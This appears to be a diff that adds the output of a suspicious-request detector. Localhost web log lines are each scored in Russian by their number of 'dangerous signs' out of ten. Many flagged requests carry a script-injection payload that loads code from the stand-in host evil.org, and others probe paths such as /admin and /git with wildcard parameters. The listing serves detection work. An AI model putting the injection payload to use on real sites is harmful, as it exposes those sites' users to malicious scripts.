+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:56,733 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:36,896 INFO 127.0.0.1 "GET /apache?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:40,307 INFO 127.0.0.1 "GET /backup?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:39,465 INFO 127.0.0.1 "GET /mirror?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:40,150 INFO 127.0.0.1 "GET /wiki?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:18,413 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:27:01,946 INFO 127.0.0.1 "GET /naginator?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:03,332 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:27:03,557 INFO 127.0.0.1 "GET /puppet?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:03,597 INFO 127.0.0.1 "GET /redmine?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:37,613 INFO 127.0.0.1 "GET /kafka?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:04,010 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:38,703 INFO 127.0.0.1 "GET /artifactory?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:21,011 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:27:03,302 INFO 127.0.0.1 "GET /memcached?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:04,435 INFO 127.0.0.1 "GET /git?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:18,578 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:03,506 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:56,898 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:37,460 INFO 127.0.0.1 "GET /graphite?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:40,212 INFO 127.0.0.1 "GET /admin?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:40,319 INFO 127.0.0.1 "GET /bamb?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:44,446 INFO 127.0.0.1 "GET /findbugs?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:01,874 INFO 127.0.0.1 "GET /mesos?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:21,218 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:41,228 INFO 127.0.0.1 "GET /mongodb?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:03,674 INFO 127.0.0.1 "GET /sensu?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:04,736 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:39,347 INFO 127.0.0.1 "GET /ldap?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:17,932 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:27:03,225 INFO 127.0.0.1 "GET /kubernetes?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:39,152 INFO 127.0.0.1 "GET /graylog?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:03,695 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:04,163 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:21,561 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:40,180 INFO 127.0.0.1 "GET /zipkin?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:37,685 INFO 127.0.0.1 "GET /kubernetes?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:38,383 INFO 127.0.0.1 "GET /stas?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:18,736 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:26:37,382 INFO 127.0.0.1 "GET /git?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:27:04,007 INFO 127.0.0.1 "GET /zabbix?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-21 12:37:56,380 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:03,854 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:18,252 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:20,488 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-21 12:37:56,019 INFO 127.0.0.1 "GET /exc?id=<script%20src="http://evil.org"></script> HTTP/1.1" 404
+      Содержит 2/10 опасных признака
+    - 2025-03-18 12:27:01,029 INFO 127.0.0.1 "GET /artifactory?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
+    - 2025-03-18 12:26:37,997 INFO 127.0.0.1 "GET /osticket?id=/* HTTP/1.1" 404
+      Содержит 1/10 опасных признака
